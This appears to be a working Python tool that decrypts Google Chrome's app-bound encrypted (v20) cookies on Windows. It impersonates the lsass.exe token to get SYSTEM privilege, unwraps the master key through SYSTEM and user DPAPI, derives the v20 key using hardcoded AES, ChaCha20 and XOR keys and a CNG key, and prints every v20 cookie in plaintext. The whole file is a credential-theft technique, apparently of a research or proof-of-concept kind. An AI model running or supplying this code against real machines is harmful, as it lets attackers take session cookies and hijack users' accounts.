import os
import io
import shutil
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
from contextlib import contextmanager
import tempfile

import windows
import windows.crypto
import windows.generated_def as gdef

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        # [flag|iv|ciphertext|tag] decrypted_blob
        # [1byte|12bytes|32bytes|16bytes]
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
        # [1byte|32bytes|12bytes|32bytes|16bytes]
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)

    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)

    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)

    return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)

def main():
    # chrome data path
    user_profile = os.environ['USERPROFILE']
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
   
    # Read Local State
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
    
    # Decrypt with SYSTEM DPAPI
    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

    # Decrypt with user DPAPI
    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
    
    # Parse key blob
    parsed_data = parse_key_blob(key_blob_user_decrypted)
    v20_master_key = derive_v20_master_key(parsed_data)

    # v20 key decrypt demo
    # fetch all v20 cookies
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db_path = os.path.join(temp_dir, "TempCookies")
        try:
            shutil.copy2(cookie_db_path, temp_db_path)

            con = sqlite3.connect(pathlib.Path(temp_db_path).as_uri() + "?mode=ro", uri=True)
            cur = con.cursor()
            r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
            cookies = cur.fetchall()
            cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
            con.close()

            # decrypt v20 cookie with AES256GCM
            # [flag|iv|ciphertext|tag] encrypted_value
            # [3bytes|12bytes|variable|16bytes]
            
            def decrypt_cookie_v20(cookie_cipher, encrypted_value):
                cookie_iv = encrypted_value[3:3+12]
                encrypted_cookie = encrypted_value[3+12:-16]
                cookie_tag = encrypted_value[-16:]
                decrypted_cookie = cookie_cipher.decrypt(cookie_iv, encrypted_cookie + cookie_tag, None)
                return decrypted_cookie[32:].decode('utf-8')

            cookie_cipher = AESGCM(v20_master_key)
            for c in cookies_v20:
                print(c[0], c[1], decrypt_cookie_v20(cookie_cipher, c[2]))

        except PermissionError as e:
                if e.winerror == 32:
                    print("Permission denied when accessing the cookie database. This is expected if Chrome is running. Please close Chrome and try again.")
                else:
                    print(f"Permission error: {e}")


if __name__ == "__main__":
    if not is_admin():
        print("This script needs to run as administrator.")
    else:
        main()